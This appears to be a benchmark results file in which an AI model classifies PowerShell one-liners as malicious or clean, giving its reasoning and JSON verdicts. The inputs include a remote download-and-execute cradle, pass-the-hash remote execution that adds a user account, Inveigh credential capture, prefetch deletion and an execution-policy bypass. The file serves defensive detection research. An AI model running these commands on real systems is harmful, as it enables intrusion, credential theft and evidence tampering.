model_name,description,is_malicious,reasoning,answer,tag,explain,input,total_tokens
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0150,Clean,"We need to analyze the provided PowerShell content. It's a command: Invoke-EgressCheck -ip 1.2.3.4 -portrange '22-25,53,80,443,445,3306,3389' -protocol ALL -delay 100 -verbose

We need to see if this is malicious. This appears to be a custom function Invoke-EgressCheck that checks egress connectivity to IP and ports. Could be benign network testing. No obvious malicious behavior. No obfuscation, no download, no credential access. It's just a network check. Could be used for reconnaissance but the script itself is just a command. The function name suggests maybe part of a security tool. Without seeing definition, we cannot know if it does something malicious. Based on observable content, it's a benign network connectivity test. So classification: Clean or maybe Likely? The instruction says if at least one malicious indicator, classify as Malicious or Likely. Here none. So Clean.

We need to produce JSON with summary, evidence (empty array), explain, is_malicious, tag (maybe ""DISCOVERY"" if we want but if Clean maybe tag can be omitted? The schema expects tag property but not required. We can include ""DISCOVERY"" as general category but if Clean maybe tag ""DISCOVERY""? The spec: ""tag"": ""Tag classifying the general category of the script if it is malicious"". If Clean, maybe omit or set null. But schema expects string type, not required. So we can omit tag.

Provide summary: ""The script invokes a custom function to test outbound connectivity to a specific IP and a set of ports.""

Explain: ""No malicious indicators such as remote code execution, download, credential access, persistence, etc. It's a network diagnostic command.""

Evidence: empty.

Return JSON.","{
  ""summary"": ""The script calls a custom function (Invoke‑EgressCheck) to test outbound connectivity to a given IP address and a list of ports with a delay and verbose output."",
  ""evidence"": [],
  ""explain"": ""The command only performs network reachability checks. It contains no obfuscation, downloading, credential harvesting, persistence mechanisms, or other typical malicious behaviors. Without the function definition, the observable content is limited to a benign diagnostic operation."",
  ""is_malicious"": ""Clean""
}",,,"# Natural language intent:
# Perform egress network checks to specified IP and port ranges with a delay and verbose output.

Invoke-EgressCheck -ip 1.2.3.4 -portrange '22-25,53,80,443,445,3306,3389' -protocol ALL -delay 100 -verbose
",1574
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0159,Clean,"We need to produce JSON per schema. The script is just ""get-process"". That's a benign command to retrieve process info. No malicious indicators. So classification: Clean. Provide summary, evidence maybe none. The evidence array can be empty. Explain why not malicious. Tag maybe ""DISCOVERY"" but since clean, tag maybe omitted? Schema requires tag property optional? It is defined but not required. We can include null? Better omit. Provide summary: ""The script lists running processes on the local system."" Provide explain: ""It only calls Get-Process, which is a standard PowerShell cmdlet for enumeration; no suspicious behavior."" is_malicious: ""Clean"". evidence empty array. Provide tag maybe ""DISCOVERY"" but not needed. The schema says tag property is defined but not required. Could include ""DISCOVERY"". But if Clean maybe tag not needed. I'll include tag ""DISCOVERY"". Provide JSON.","{
  ""summary"": ""The script enumerates all running processes on the local machine using the built‑in Get‑Process cmdlet."",
  ""evidence"": [],
  ""explain"": ""Get‑Process is a standard PowerShell command for legitimate system discovery. The script contains no remote calls, credential handling, persistence mechanisms, obfuscation, or any other behavior associated with malicious activity."",
  ""is_malicious"": ""Clean"",
  ""tag"": ""DISCOVERY""
}",,,"# Natural language intent:
# Retrieve information about running processes in PowerShell.

get-process
",1320
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0157,Malicious,"We need to produce JSON per schema. The script: ""Invoke-Expression ${input_file}"". This runs whatever is in variable input_file (presumably a file path). This is a generic execution of arbitrary code; it's potentially malicious because it allows execution of arbitrary PowerShell from a variable, could be used for code injection. However without more context, it's suspicious but not definitively malicious. It's a typical pattern for executing user-provided content, which is dangerous. So classification: Likely malicious (suspicious). Provide summary, evidence: code segment ""Invoke-Expression ${input_file}"" tag: EXECUTION, maybe DEFENSE_EVASION? It's direct execution. Also OBFUSCATION not present. Provide explanation.

Return JSON with required fields: summary, is_malicious, explain, evidence array, tag (general category). Tag maybe ""EXECUTION"". Provide evidence items with code, code_explain, tag.

Let's craft.

","{
  ""summary"": ""The script executes whatever PowerShell code is contained in the variable `input_file` using `Invoke-Expression`."",
  ""evidence"": [
    {
      ""code"": ""Invoke-Expression ${input_file}"",
      ""code_explain"": ""`Invoke-Expression` evaluates a string as PowerShell code. Supplying the content of a variable (or file) directly to it allows arbitrary code execution, which is a classic technique for command execution and is often used by malware to run downloaded or staged payloads."",
      ""tag"": ""EXECUTION""
    }
  ],
  ""explain"": ""The use of `Invoke-Expression` on uncontrolled input is a high‑risk pattern that enables execution of arbitrary PowerShell code, a common behavior in malicious scripts. While the snippet alone does not show a payload, the technique is inherently suspicious and frequently abused for remote code execution, downloader behavior, or post‑compromise actions."",
  ""is_malicious"": ""Likely"",
  ""tag"": ""EXECUTION""
}",,,"# Natural language intent:
# Execute PowerShell code from the specified input file.

Invoke-Expression ${input_file}
",1448
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0154,Malicious,"We need to analyze the provided PowerShell content:

```
# Natural language intent:
# Execute reflective PowerShell code encoded in SharpGen's format.

Invoke-SSharp -source 'Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7'
```

We need to produce JSON with summary, evidence array, explain, is_malicious, tag.

We need to identify suspicious behavior: Invoke-SSharp is likely a custom function that loads and executes reflective code. The source string is base64: decode it.

Let's decode base64: ""Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7""

Base64 decode: Let's decode manually. Using known base64 decode: ""Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7""

Break: Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7

Decode: ""Console.WriteLine(\""Testing S#!\"") ;""? Let's decode.

Base64 decode: Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7

I think it's ""Console.WriteLine(\""Testing S#!\"") ;"". Let's verify: ""Console.WriteLine(\""Testing S#!\"") ;"" in ASCII base64: Let's compute quickly: ""Console.WriteLine(\""Testing S#!\"") ;"" -> bytes: C o n s o l e . W r i t e L i n e ( "" T e s t i n g   S # ! "" ) ; . Let's use known base64: ""Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7"". Yes that matches.

So the script is invoking a function that likely loads .NET assembly code (SharpGen) to execute reflective code. This is typical of offensive tools (SharpGen, reflective loader). The code is base64-encoded .NET code that writes to console. Could be benign demonstration, but the use of reflective execution is suspicious.

We need to tag: OBFUSCATION (base64), EXECUTION (reflective), possibly DEFENSE_EVASION (reflective loading bypasses detection). Also DOWNLOADER? Not present.

Thus classification: Likely malicious? Since it's just printing ""Testing S#!"" maybe a test. But the presence of Invoke-SSharp (custom) suggests malicious tool. Without more context, we may label Likely.

Provide evidence: code segment: Invoke-SSharp -source '...'

Explain: Use of custom function to load base64-encoded .NET code, reflective execution.

Tag: OBFUSCATION, EXECUTION, DEFENSE_EVASION.

Now produce JSON.

","{
  ""summary"": ""The script calls a custom function (Invoke‑SSharp) to load and execute a Base64‑encoded .NET payload (SharpGen reflective code)."",
  ""evidence"": [
    {
      ""code"": ""Invoke-SSharp -source 'Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7'"",
      ""code_explain"": ""The command invokes a non‑standard PowerShell function (Invoke‑SSharp) that is typically used to load and execute reflective .NET assemblies. The payload is supplied as a Base64 string, which decodes to `Console.WriteLine(\""Testing S#!\"");`. Supplying code in Base64 is a classic obfuscation technique that hides the actual commands from casual inspection and can be used to bypass simple string‑based detections. Reflective loading executes code in memory without writing a file to disk, a known defense‑evasion method."",
      ""tag"": ""OBFUSCATION""
    },
    {
      ""code"": ""Invoke-SSharp -source 'Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7'"",
      ""code_explain"": ""The function likely performs in‑memory compilation or loading of the decoded .NET snippet, resulting in immediate execution (EXECUTION). Reflective execution is frequently employed by offensive tools to run malicious payloads while avoiding traditional AV file‑based detection."",
      ""tag"": ""EXECUTION""
    },
    {
      ""code"": ""Invoke-SSharp -source 'Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7'"",
      ""code_explain"": ""By using a custom loader rather than standard PowerShell cmdlets (e.g., Add-Type, Invoke-Expression), the script attempts to evade built‑in logging and AMSI scanning, which classifies it as DEFENSE_EVASION."",
      ""tag"": ""DEFENSE_EVASION""
    }
  ],
  ""explain"": ""The script employs a custom reflective loader with a Base64‑encoded payload, a pattern commonly seen in offensive PowerShell toolkits. While the decoded payload only prints a test string, the technique itself (in‑memory reflective execution with obfuscation) is indicative of malicious behavior, so the script is considered suspicious."",
  ""is_malicious"": ""Likely"",
  ""tag"": ""OBFUSCATION""
}",,,"# Natural language intent:
# Execute reflective PowerShell code encoded in SharpGen's format.

Invoke-SSharp -source 'Q29uc29sZS5Xcml0ZUxpbmUoIlRlc3RpbmcgUyMhIik7'
",2228
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0161,Malicious,"We need to produce JSON per schema. Summarize: script attempts remote command execution via SMBExec with credentials. Identify evidence: the Invoke-SMBExec command with target, domain, username, hash. Tag: REMOTE_COMMAND_EXECUTION, CREDENTIAL_ACCESS maybe. Also possibly PRIVILEGE_ESCALATION? Not necessarily. It's malicious likely. Provide explanation. Determine is_malicious: Likely or Malicious? Using SMBExec with hash suggests credential use and remote execution, typical offensive. Could be legitimate admin tool, but context suggests malicious. I'd classify Likely? The instruction says if at least one malicious indicator, classify as Malicious or Likely. Since it's clearly remote command execution with stolen hash, I'd go Malicious. Provide tag: REMOTE_COMMAND_EXECUTION. Provide evidence array with one item.

Return JSON with required fields: summary, evidence, explain, is_malicious, tag (optional if malicious). Tag field: maybe ""REMOTE_COMMAND_EXECUTION"". Provide.

Let's craft.","{
  ""summary"": ""The script uses the Invoke‑SMBExec function to run commands on a remote host (192.168.100.20) by providing domain, username, and an NTLM hash."",
  ""evidence"": [
    {
      ""code"": ""Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0"",
      ""code_explain"": ""Invoke‑SMBExec is a PowerShell implementation of the SMBExec technique, which authenticates to a remote Windows host using supplied credentials (including an NTLM hash) and spawns a process under the context of that account. Supplying a clear‑text hash and targeting an internal IP address is a classic indicator of credential‑based remote command execution, often used by attackers for lateral movement."",
      ""tag"": ""REMOTE_COMMAND_EXECUTION""
    },
    {
      ""code"": ""-Hash F6F38B793DB6A94BA04A52F1D3EE92F0"",
      ""code_explain"": ""Passing an NTLM hash directly enables pass‑the‑hash style authentication, which is a credential‑access and privilege‑escalation technique. The presence of a raw hash in script text is a strong sign of offensive use."",
      ""tag"": ""CREDENTIAL_ACCESS""
    }
  ],
  ""explain"": ""The script performs credential‑based remote command execution against a target machine, a behavior that aligns with lateral movement and post‑compromise activity. The explicit use of a password hash further indicates malicious intent."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""REMOTE_COMMAND_EXECUTION""
}",,,"# Natural language intent:
# Attempts to execute commands on a remote system using SMBExec with specified credentials.

Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0
",1657
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0169,Malicious,"We need to produce JSON per schema. Summarize: script attempts to add new user via Invoke-SMBExec remote execution. Identify evidence: the Invoke-SMBExec command with remote target, domain, username, hash, and net user command. Tags: REMOTE_COMMAND_EXECUTION, CREDENTIAL_ACCESS (hash), PERSISTENCE (adding user), PRIVILEGE_ESCALATION maybe. Provide explanation. Determine is_malicious: likely malicious because adding user on remote system without authorization. So ""Malicious"". Tag general category: ""PERSISTENCE"" or ""PRIVILEGE_ESCALATION"". Probably ""PERSISTENCE"". Provide evidence array with code, explanation, tag.

Return JSON with required fields: summary, evidence, explain, is_malicious, tag. Ensure additionalProperties false. Provide required fields. Let's craft.

","{
  ""summary"": ""The script uses Invoke‑SMBExec to execute a remote command that creates a new local user (SMBExec) with a known password on the target machine."",
  ""evidence"": [
    {
      ""code"": ""Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command 'net user SMBExec Winter2017 /add'"",
      ""code_explain"": ""Invoke‑SMBExec leverages SMB authentication (pass‑the‑hash) to run arbitrary commands on a remote Windows host. Supplying a NTLM hash (-Hash) is a credential‑access technique. The embedded command `net user SMBExec Winter2017 /add` creates a new local account, which provides persistence and can be used for privilege escalation or lateral movement."",
      ""tag"": ""REMOTE_COMMAND_EXECUTION""
    },
    {
      ""code"": ""-Hash F6F38B793DB6A94BA04A52F1D3EE92F0"",
      ""code_explain"": ""Passing a clear‑text NTLM hash enables pass‑the‑hash authentication, a credential‑access method that bypasses normal password verification."",
      ""tag"": ""CREDENTIAL_ACCESS""
    },
    {
      ""code"": ""'net user SMBExec Winter2017 /add'"",
      ""code_explain"": ""The `net user … /add` command creates a new local account, a classic persistence technique that gives the attacker a foothold for future logons."",
      ""tag"": ""PERSISTENCE""
    }
  ],
  ""explain"": ""The script performs remote command execution using stolen credentials to add a new user on the target system, which is a clear indicator of malicious activity aimed at establishing persistence and facilitating further compromise."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""PERSISTENCE""
}",,,"# Natural language intent:
# Attempts to add a new user ('SMBExec') with the password 'Winter2017' on a remote system using SMBExec.

Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command 'net user SMBExec Winter2017 /add'
",1691
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0174,Malicious,"We need to produce JSON per schema. Summarize: script downloads and executes remote PowerShell script. Identify evidence: the URL variable, Invoke-Expression with DownloadString. Tags: DOWNLOADER, EXECUTION, OBFUSCATION maybe not, but remote code execution. Classification: Malicious (definitely offensive). Provide explanation. Also include IOCs? URL is http://exploit.com/WinHack64.ps1. Provide evidence array with code segments.

We need fields: summary, evidence (array of objects with code, code_explain, tag), explain, is_malicious, tag (general category). Tag maybe ""DOWNLOADER"" or ""EXECUTION"". Choose one main tag: ""DOWNLOADER"". Provide.

Make sure required fields: summary, is_malicious, explain. evidence optional but we include.

Return JSON.","{
  ""summary"": ""The script retrieves a PowerShell file from a remote HTTP server and immediately executes it using Invoke-Expression."",
  ""evidence"": [
    {
      ""code"": ""$url = \""http://exploit.com/WinHack64.ps1\"";"",
      ""code_explain"": ""Defines a hard‑coded HTTP URL pointing to an external script. Use of an unencrypted HTTP endpoint is a strong indicator of malicious downloader behavior."",
      ""tag"": ""DOWNLOADER""
    },
    {
      ""code"": ""Invoke-Expression (New-Object System.Net.WebClient).DownloadString($url)"",
      ""code_explain"": ""Creates a WebClient object, downloads the raw script text from the remote URL, and passes it to Invoke-Expression, which executes the downloaded code in the current session. This pattern provides remote code execution and is a classic technique for delivering payloads."",
      ""tag"": ""EXECUTION""
    }
  ],
  ""explain"": ""The script performs a classic PowerShell downloader pattern: it fetches a script from an external HTTP address and runs it without any validation or sandboxing. This behavior is characteristic of malicious activity, enabling an attacker to execute arbitrary code on the victim host."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""DOWNLOADER""
}",,,"# Natural language intent:
# Downloads and executes a PowerShell script from a specified URL.

$url = ""http://exploit.com/WinHack64.ps1""; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($url)
",1514
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0172,Malicious,"We need to analyze the given PowerShell script:

```
Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch*.pf"" -Name)[0])
```

Goal: Summarize, identify suspicious indicators, decode (none), attribute tags, evidence, iocs, classification.

The script removes an item (file) from the prefetch directory. It joins the system root prefetched path with the first .pf file found (Get-ChildItem ... -Name returns array of filenames matching pattern). Then Remove-Item deletes it.

Potential malicious behavior: Deleting prefetch files is a known defense evasion technique to hide execution artifacts. Prefetch files are used by Windows to speed up loading of executables and also for forensic evidence. Deleting them can hinder detection. So this is a defensive evasion / cleanup.

Thus classification: Malicious (defense evasion). Could be used by legitimate admin script to clean prefetch, but typical malicious usage is to hide traces. So we label as Malicious with tag DEFENSE_EVASION.

Evidence: code segment is the Remove-Item command.

Tag: DEFENSE_EVASION (or maybe ""CLEANUP"" but not in list; use DEFENSE_EVASION). Also could be ""PERSISTENCE""? No. So tag: DEFENSE_EVASION.

Explain: The script deletes a prefetch file, which is a known artifact used for forensic analysis; removing it is suspicious.

No IOCs like URLs.

Return JSON with required fields: summary, evidence (array), explain, is_malicious, tag.

We need to include evidence items with code, code_explain, tag.

Let's craft.

","{
  ""summary"": ""The script deletes the first .pf prefetch file found in the Windows Prefetch directory."",
  ""evidence"": [
    {
      ""code"": ""Remove-Item -Path (Join-Path \""$Env:SystemRoot\\prefetch\"" (Get-ChildItem -Path \""$Env:SystemRoot\\prefetch*.pf\"" -Name)[0])"",
      ""code_explain"": ""The command builds a full path to a .pf file in %SystemRoot%\\Prefetch using Join-Path and Get-ChildItem, then calls Remove-Item to delete that file. Deleting prefetch files is a known technique to erase execution traces and hinder forensic analysis, which is characteristic of defense‑evasion behavior."",
      ""tag"": ""DEFENSE_EVASION""
    }
  ],
  ""explain"": ""Removing prefetch files provides no functional benefit to normal system operation and is commonly used by malware to hide its execution history, so the script exhibits clear defense‑evasion intent."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""DEFENSE_EVASION""
}",,,"# Natural language intent:
# Removes an item specified by the path after joining with the result of a command that retrieves the first item in the prefetch directory.

Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch*.pf"" -Name)[0])
",1677
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0179,Malicious,"We need to produce JSON per schema. The script is a simple command invoking Inveigh, a PowerShell tool for LLMNR/NBT-NS poisoning and SMB relay, used for network discovery and credential capture. This is malicious/offensive. Identify evidence: the command itself. Tag: LATERAL_MOVEMENT? Actually Inveigh is for credential harvesting (CREDENTIAL_ACCESS) and DISCOVERY. Also DEFENSE_EVASION maybe. Provide summary, evidence array with code, explanation, tag. is_malicious: Malicious. tag: CREDENTIAL_ACCESS or LATERAL_MOVEMENT? Choose ""CREDENTIAL_ACCESS"". Provide explain.","{
  ""summary"": ""The script runs the Inveigh PowerShell module to launch network‑based attacks (LLMNR/NBT‑NS poisoning, SMB relay) against the specified IP address."",
  ""evidence"": [
    {
      ""code"": ""Invoke-Inveigh -IP 192.168.1.10 -HTTP N"",
      ""code_explain"": ""Invoke‑Inveigh is a known offensive PowerShell tool that performs LLMNR/NBT‑NS poisoning, SMB relay, and HTTP/HTTPS spoofing. Running it against a target IP initiates credential‑harvesting attacks and can be used for lateral movement. The presence of this command indicates active exploitation rather than benign administration."",
      ""tag"": ""CREDENTIAL_ACCESS""
    }
  ],
  ""explain"": ""The use of the Inveigh module is a clear indicator of malicious intent, as it is designed to capture NTLM hashes and other credentials from network traffic. The script does not contain any defensive or legitimate functionality beyond launching this attack tool."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""CREDENTIAL_ACCESS""
}",,,"# Natural language intent:
# Invokes Inveigh with specified parameters, potentially for network discovery and interception.

Invoke-Inveigh -IP 192.168.1.10 -HTTP N
",1422
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0229,Clean,"We need to produce JSON per schema. The script is just `$env:username`. That's benign, just reads env var. No malicious behavior. So summary: script outputs current username. Evidence: none. Explain: no malicious indicators. is_malicious: Clean. tag maybe ""EXECUTION""? But if Clean, tag maybe omitted? Schema requires tag property optional? It is defined but not required. We can include null or omit. Provide empty array for evidence. Provide summary, explain, is_malicious, maybe tag omitted. Let's craft.

","{
  ""summary"": ""The script simply reads and outputs the current user's username from the environment variables."",
  ""evidence"": [],
  ""explain"": ""The code only accesses the $env:username variable, which is a standard, non‑malicious operation. No remote execution, credential harvesting, persistence, obfuscation, or other suspicious behavior is present."",
  ""is_malicious"": ""Clean""
}",,,"# Natural language intent:
# Retrieves the current username from the environment variables.

$env:username
",1237
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0196,Malicious,"We need to produce JSON per schema. Summarize: script runs malicious script with bypass etc. Identify evidence: the command line with ExecutionPolicy Bypass, Hidden window, etc. Tags: EXECUTION, DEFENSE_EVASION (bypass), PERSISTENCE maybe not. It's a command line, not script content, but still malicious. Provide evidence array with code segment and explanation. Determine is_malicious: Malicious. Tag: EXECUTION or DEFENSE_EVASION? Probably ""EXECUTION"". Provide explain.","{
  ""summary"": ""The command launches a PowerShell script (C:\\MaliciousScript.ps1) while bypassing execution policy, hiding the window, and running without a profile."",
  ""evidence"": [
    {
      ""code"": ""powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -WindowStyle Hidden -NoProfile -File \""C:\\MaliciousScript.ps1\"""",
      ""code_explain"": ""The command uses -ExecutionPolicy Bypass to override the system's PowerShell execution policy, a common defense‑evasion technique. -WindowStyle Hidden and -NoLogo/-NonInteractive hide any UI, allowing the script to run silently. -NoProfile prevents loading of user profiles that might contain detection hooks. Together these flags indicate an attempt to execute code covertly."",
      ""tag"": ""DEFENSE_EVASION""
    },
    {
      ""code"": ""-File \""C:\\MaliciousScript.ps1\"""",
      ""code_explain"": ""Specifies an external script file to run. The path points to a known malicious script, indicating direct execution of potentially harmful code."",
      ""tag"": ""EXECUTION""
    }
  ],
  ""explain"": ""The use of ExecutionPolicy Bypass, hidden window, and no‑profile options demonstrates intentional evasion of security controls to run a script located at a suspicious path, which is characteristic of malicious behavior."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""EXECUTION""
}",,,"# Natural language intent:
# Executes a malicious PowerShell script located at ""C:\MaliciousScript.ps1"" with specific execution policies and settings.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -WindowStyle Hidden -NoProfile -File ""C:\MaliciousScript.ps1""
",1493
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0225,Clean,"We need to analyze the provided PowerShell content. It's a command: Get-IndexedItem -Filter Contains(,'Stingray'), kind = 'picture', keywords='pin'

We need to see if malicious. This appears to be a legitimate cmdlet maybe from Windows Search or some module. It's just retrieving indexed items with filter. No suspicious behavior. No remote execution, no download, no credential access. So classification: Clean or maybe Not really malicious. According to categories, it's likely benign. So is_malicious = Clean. Provide summary, evidence empty array, explain why not malicious.

Return JSON with required fields. Provide summary: ""Retrieves indexed items (pictures) containing the keyword 'Stingray' and 'pin'."" Provide explain: ""The script only performs a local query using Get-IndexedItem; no network, no persistence, no obfuscation, etc.""

Tag maybe ""DISCOVERY""? But if Clean, tag maybe null or omitted. The schema expects tag property optional? It is defined but not required. We can include tag as ""DISCOVERY"" but classification Clean. The spec says tag classifying general category of the script if it is malicious. Since not malicious, maybe omit or set null. We'll omit.

Provide evidence empty array.

Return JSON.","{
  ""summary"": ""Runs a local query to retrieve picture items from the index that contain the keyword \""Stingray\"" and have the keyword \""pin\""."",
  ""evidence"": [],
  ""explain"": ""The command only uses the built‑in Get‑IndexedItem cmdlet to perform a local search. It does not contact remote hosts, download or execute code, access credentials, modify the system, or employ any obfuscation techniques. Therefore it shows no malicious or offensive behavior."",
  ""is_malicious"": ""Clean""
}",,,"# Natural language intent:
# Gets indexed items with specific filtering conditions and keywords.

Get-IndexedItem -Filter Contains(,'Stingray'), kind = 'picture', keywords='pin'
",1432
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0231,Malicious,"We need to produce JSON per schema. The script is a PowerShell command: Get-System -ServiceName 'PrivescSvc' -PipeName 'secret'

We need to analyze. This appears to be a custom function Get-System that likely attempts privilege escalation via a service and named pipe. This is suspicious. However we don't have definition of Get-System; could be benign internal tool. But the intent is privilege escalation. So tag: PRIVILEGE_ESCALATION. Evidence: the command uses Get-System with ServiceName and PipeName parameters, indicating attempt to obtain system-level privileges.

We need summary, evidence array, explain, is_malicious classification, tag.

Given limited code, we can classify as Likely malicious because it's attempting privilege escalation, but without seeing implementation we can't be certain. So Likely.

Tag: PRIVILEGE_ESCALATION.

Provide evidence with code snippet.

Return JSON.","{
  ""summary"": ""The script invokes a custom Get-System function with a service and pipe name, indicating an attempt to acquire system‑level privileges."",
  ""evidence"": [
    {
      ""code"": ""Get-System -ServiceName 'PrivescSvc' -PipeName 'secret'"",
      ""code_explain"": ""The command calls a function named Get-System and supplies a service name and a named‑pipe identifier. Such parameters are typical of techniques that exploit vulnerable services or named‑pipe impersonation to elevate the current process to SYSTEM. The presence of explicit service and pipe names strongly suggests privilege‑escalation behavior."",
      ""tag"": ""PRIVILEGE_ESCALATION""
    }
  ],
  ""explain"": ""The only observable behavior is a call to a function that appears designed to elevate privileges via a service and named pipe. While the actual implementation is not shown, the intent aligns with known privilege‑escalation tactics, making the script suspicious."",
  ""is_malicious"": ""Likely"",
  ""tag"": ""PRIVILEGE_ESCALATION""
}",,,"# Natural language intent:
# Attempts to obtain system-level privileges using specific service and pipe names.

Get-System -ServiceName 'PrivescSvc' -PipeName 'secret'
",1465
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0233,Clean,"We need to analyze the provided PowerShell content. It's a simple script to create a Hyper-V VM, disable secure boot, start it. No malicious indicators. It's benign admin task. So classification Clean. Provide summary, evidence (maybe none). But need to include evidence array possibly empty. Provide explain. Tag maybe ""EXECUTION"" but since clean, tag maybe null or omitted. According to schema, tag is optional? It is defined but not required. Provide maybe ""NONE"". Provide is_malicious ""Clean"". Provide summary. Provide empty evidence array.","{
  ""summary"": ""The script creates a Hyper‑V virtual machine with the specified name, sets it to Generation 2, disables Secure Boot, and then starts the VM."",
  ""evidence"": [],
  ""explain"": ""The commands used (New‑VM, Set‑VMFirmware, Start‑VM) are standard Hyper‑V administration cmdlets. There is no remote execution, credential harvesting, persistence, obfuscation, downloader behavior, or any other technique associated with malicious activity. The script performs a straightforward, legitimate VM provisioning task."",
  ""is_malicious"": ""Clean"",
  ""tag"": null
}",,,"# Natural language intent:
# Create a new Hyper-V virtual machine named ${vm_name} with Generation 2, disable Secure Boot in its firmware settings, and start the virtual machine.

$VM = ""${vm_name}"" ; New-VM -Name $VM -Generation 2 ; Set-VMFirmware $VM -EnableSecureBoot Off ; Start-VM $VM
",1335
